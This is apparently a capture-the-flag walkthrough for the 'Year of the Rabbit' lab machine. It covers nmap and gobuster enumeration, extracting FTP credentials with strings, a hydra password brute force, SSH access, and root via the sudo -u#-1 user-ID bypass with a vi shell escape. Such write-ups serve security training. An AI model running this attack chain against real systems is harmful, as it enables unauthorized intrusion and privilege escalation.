
## 9. Year of the Rabbit

```
nmap -sC -sV -Pn <IP>
```

```
gobuster dir -u <URL> -w <wordlist>
```

![enum result](Assets/20.png)

We can try ftp login

Nothing happened

We found /assets directory lets look it up

Found a file called style.css

![enum result](Assets/21.png)

It has redirected us again to the rick roll meme

##### Now open burp suite and intercept the /sup3r_s3cr3t_f14g.php request

![enum result](Assets/22.png)

Found this

![enum result](Assets/23.png)

While going to this link I found an image

I performed steghide --extract -sf hotbabe.png

Found nothing so I did

```
strings hotbabe.png
```

We found FTP username and a dictionary

![enum result](Assets/24.png)

Save all passwords in a file and we will brute force using hydra

```
hydra -l ftpuser -P rabbit.txt <IP> ftp
```

##### Found the password – 5iez1wXKfPKQ

Login using ftp

```
ftp <ip>
```

We found a file

```
get <filename>
```

We found something which we can’t decode and its called BrainFuck

![enum result](Assets/25.png)

For this we will need beef

```
beef <filename>
```

![enum result](Assets/26.png)

Now do an ssh login

```
ssh eli@<IP>
```

find / -name user.txt 2>/dev/null

```
cat <path>
```

![enum result](Assets/27.png)

We cannot enter into the file

We have another user named gwendoline

Now we do have a clue

![enum result](Assets/28.png)

```
find / -name s3cr3t 2>/dev/null
```

![enum result](Assets/29.png)

It is a directory

```
cd /usr/games/s3cr3t
```

```
ls -la
```

```
cat ./<filename>
```

![enum result](Assets/30.png)
##### We found Gwendoline password

```
su gwendoline
```

![enum result](Assets/31.png)

```
sudo -l
```

![enum result](Assets/32.png)

We found no password login at /usr/bin/vi which we also found in our previous room Chocolate factory

Let us look in gtfobins

https://gtfobins.org/gtfobins/vim/

![enum result](Assets/33.png)

Here if we use gtfobins directly we wont get access

Let us use user flag but stating user as -1

0 = root

1 = user

-1 = Confuses machine

```
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

```
:!/bin/sh
```

Locate root flag

##### Now we are root

  ![enum result](Assets/34.png)